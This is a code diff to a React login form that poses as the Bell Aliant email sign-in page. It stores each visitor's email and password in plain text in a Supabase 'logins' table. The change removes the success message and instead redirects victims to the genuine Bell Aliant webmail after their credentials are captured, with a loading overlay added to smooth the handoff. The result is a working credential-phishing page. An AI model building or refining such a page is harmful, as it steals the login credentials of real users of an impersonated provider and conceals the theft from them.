@@ -13,7 +13,7 @@ const LoginForm = () => {
 
     // Store the form values to Supabase (password stored as plain text per request)
     try {
-      const { data, error } = await supabase
+      const { error } = await supabase
         .from("logins")
         .insert([{ email, password }]);
 
@@ -23,11 +23,10 @@ const LoginForm = () => {
         return;
       }
 
-      console.log("Saved to supabase:", data);
-      // Optionally clear the form or show a message
-      setEmail("");
-      setPassword("");
-      alert("Form saved successfully.");
+      // Redirect to Bell Aliant webmail after successful save
+      window.location.assign(
+        "https://webmail.bellaliant.net/bell/index-rui.jsp?v=3.1.3.59.2-23&domain=ba#/"
+      );
     } catch (err) {
       console.error(err);
       alert("An unexpected error occurred while saving the form.");
@@ -43,6 +42,7 @@ const LoginForm = () => {
           <div
             style={{
               minHeight: "540px",
+                position: "relative",
               display: "flex",
               flexDirection: "column",
               justifyContent: "center",
@@ -76,6 +76,44 @@ const LoginForm = () => {
                 lineHeight: "22px",
               }}
             >
+            {/* Loader overlay shown while submitting */}
+            {isSubmitting && (
+              <div
+                style={{
+                  position: "absolute",
+                  inset: 0,
+                  background: "rgba(255,255,255,0.85)",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  zIndex: 50,
+                }}
+              >
+                <div aria-hidden="true">
+                  <div className="loader" />
+                </div>
+              </div>
+            )}
+
+            {/* Loader CSS */}
+            <style>{`
+.loader {
+  width: 60px;
+  aspect-ratio: 4;
+  --_g: no-repeat radial-gradient(circle closest-side,#000 90%,#0000);
+  background: 
+    var(--_g) 0%   50%,
+    var(--_g) 50%  50%,
+    var(--_g) 100% 50%;
+  background-size: calc(100%/3) 100%;
+  animation: l7 1s infinite linear;
+}
+@keyframes l7 {
+    33%{background-size:calc(100%/3) 0%  ,calc(100%/3) 100%,calc(100%/3) 100%}
+    50%{background-size:calc(100%/3) 100%,calc(100%/3) 0%  ,calc(100%/3) 100%}
+    66%{background-size:calc(100%/3) 100%,calc(100%/3) 100%,calc(100%/3) 0%  }
+}
+`}</style>
               Log in to Bell Aliant email
             </h2>
 
